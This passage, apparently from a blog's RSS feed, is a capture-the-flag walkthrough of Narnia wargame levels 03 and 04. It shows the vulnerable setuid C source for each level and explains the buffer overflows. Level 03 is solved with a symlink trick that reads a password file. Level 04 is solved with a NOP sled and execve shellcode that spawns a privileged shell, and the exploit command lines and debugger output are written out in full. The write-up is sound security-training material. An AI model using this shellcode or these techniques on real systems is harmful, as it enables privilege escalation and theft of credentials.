&lt;/p&gt;

&lt;h2 id=&#34;level-03:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 03&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt; &lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
 
        &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;ifd,&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;ofd;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ofile[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/dev/null&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ifile[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
 
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;usage, %s file, will send contents of file 2 /dev/null&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
 
        &lt;span style=&#34;color: #75715e&#34;&gt;/* open files */&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(ifile,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;((ofd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(ofile,O_RDWR))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;error opening %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ofile);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;((ifd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(ifile,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;O_RDONLY))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;error opening %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ifile);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
 
        &lt;span style=&#34;color: #75715e&#34;&gt;/* copy from file1 to file2 */&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;read(ifd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;write(ofd,buf,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;copied contents of %s to a safer place... (%s)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,ifile,ofile);&lt;/span&gt;
 
        &lt;span style=&#34;color: #75715e&#34;&gt;/* close &amp;#39;em */&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;close(ifd);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;close(ofd);&lt;/span&gt;
 
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;At first glance this looks a bit more complicated. However it is just another
buffer overflow (line 13 and 22). This time however we don&amp;rsquo;t control the stack,
we control where the file gets written to. &lt;code&gt;/dev/null&lt;/code&gt; is not a useful place
for data, and we want the contents of &lt;code&gt;/etc/narnia_pass/narnia4&lt;/code&gt;. As &lt;code&gt;narnia3&lt;/code&gt; runs
setuid narnia4, it can do that for us.&lt;/p&gt;

&lt;p&gt;First we determine that we need 32 characters to overflow the buffer. Then anything
beyond that will get written to the ofile. So the plan is to to create a symlink to
&lt;code&gt;narnia4&lt;/code&gt; that is 32 characters long, and then write that to the target. The issue here
is that the source path&amp;rsquo;s last 16 characters need to be the same as the target.
So to do this I created the following directory and symlink:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia3@melinda:/narnia$ mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Now when we pass that to &lt;code&gt;narnia3&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia3@melinda:/narnia$ ./narnia3 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;/tmp/&amp;#39; + &amp;#39;x&amp;#39;*27 + &amp;#39;/tmp/narn4&amp;#39;&amp;quot;`&lt;/span&gt; 
copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)
narnia3@melinda:/narnia$ cat /tmp/narn4 
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s a little odd, but I hope you understand what happened. The last part of the
first path has to be a valid path, so that it can be written to. That&amp;rsquo;s why we have
the double &lt;code&gt;/tmp&lt;/code&gt; setup.&lt;/p&gt;

&lt;h2 id=&#34;level-04:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 04&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;ctype.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;environ;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;256&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;environ[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(environ[i],&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(environ[i]));&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(buffer,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;MOAR OVERFLOWS. This time you&amp;rsquo;ll notice something at line 6. What this does
is &lt;a href=&#34;http://man7.org/linux/man-pages/man7/environ.7.html&#34;&gt;store the user environment&lt;/a&gt;.
This then get zerod out inside &lt;code&gt;main&lt;/code&gt; to prevent us from storing any shellcode
in environment variables. However we might still be able to write &lt;code&gt;EIP&lt;/code&gt;, so using the
trusty pattern generator from before&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5
Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia4@melinda:/narnia$ gdb -q ./narnia4 
Reading symbols from ./narnia4...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /games/narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4
Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3
Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x316a4130 in ?? ()
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 0x316a4130
Pattern 0x316a4130 first occurrence at position 272 in pattern.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;This tells us we have 272 bytes to play with. Plenty of space to construct
a nopsled and shellcode payload. Let&amp;rsquo;s find out what we need to write into
&lt;code&gt;EIP&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) r $(python -c &amp;quot;print &amp;#39;a&amp;#39;*272 + &amp;#39;bbbb&amp;#39;&amp;quot;)
Starting program: /games/narnia/narnia4 $(python -c &amp;quot;print &amp;#39;a&amp;#39;*272 + &amp;#39;bbbb&amp;#39;&amp;quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
0xffffd5c0:	0x00000000	0xffffd654	0xffffd660	0xf7feacea
0xffffd5d0:	0x00000002	0xffffd654	0xffffd5f4	0x080497cc
0xffffd5e0:	0x0804825c	0xf7fca000	0x00000000	0x00000000
0xffffd5f0:	0x00000000	0x7cc8a421	0x44f76031	0x00000000
0xffffd600:	0x00000000	0x00000000	0x00000002	0x080483b0
0xffffd610:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd620:	0x00000002	0x080483b0	0x00000000	0x080483d1
0xffffd630:	0x080484ad	0x00000002	0xffffd654	0x08048550
0xffffd640:	0x080485c0	0xf7feb180	0xffffd64c	0x0000001c
0xffffd650:	0x00000002	0xffffd78f	0xffffd7a5	0x00000000
0xffffd660:	0xffffd8ba	0xffffd8ce	0xffffd8de	0xffffd8f1
0xffffd670:	0xffffd914	0xffffd927	0xffffd930	0xffffd93d
0xffffd680:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3
0xffffd690:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
0xffffd6a0:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
0xffffd6b0:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd6c0:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000
0xffffd6d0:	0x00000010	0x1f898b75	0x00000006	0x00001000
0xffffd6e0:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd6f0:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd700:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd710:	0x00000009	0x080483b0	0x0000000b	0x000036b4
0xffffd720:	0x0000000c	0x000036b4	0x0000000d	0x000036b4
0xffffd730:	0x0000000e	0x000036b4	0x00000017	0x00000000
0xffffd740:	0x00000019	0xffffd76b	0x0000001f	0xffffdfe2
0xffffd750:	0x0000000f	0xffffd77b	0x00000000	0x00000000
0xffffd760:	0x00000000	0x00000000	0x9e000000	0x9213cb6c
0xffffd770:	0x8eef41b1	0xe0574cc7	0x69a73659	0x00363836
0xffffd780:	0x00000000	0x00000000	0x00000000	0x2f000000
0xffffd790:	0x656d6167	0x616e2f73	0x61696e72	0x72616e2f
0xffffd7a0:	0x3461696e	0x61616100	0x61616161	0x61616161
0xffffd7b0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7c0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7d0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7e0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd800:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd810:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd820:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8b0:	0x61616161	0x62626261	0x00000062	0x00000000
0xffffd8c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd8d0:	0x00000000	0x00000000	0x00000000	0x00000000
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Our input starts at around &lt;em&gt;0xffffd7a8&lt;/em&gt; so let&amp;rsquo;s get going writing our payload.
Create a nopsled that is &lt;em&gt;272 - 25&lt;/em&gt; bytes long, follow that with the
the same shellcode as before, and finish with an address that sits comfortably
in the sled. You normally need to play with the address a bit, as the offsets
inside &lt;em&gt;gdb&lt;/em&gt; are a bit different.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia4@melinda:/narnia$ ./narnia4 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\x90&amp;#39;*(272-25) + &amp;#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&amp;#39; + &amp;#39;\x30\xd8\xff\xff&amp;#39;&amp;quot;`&lt;/span&gt;
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>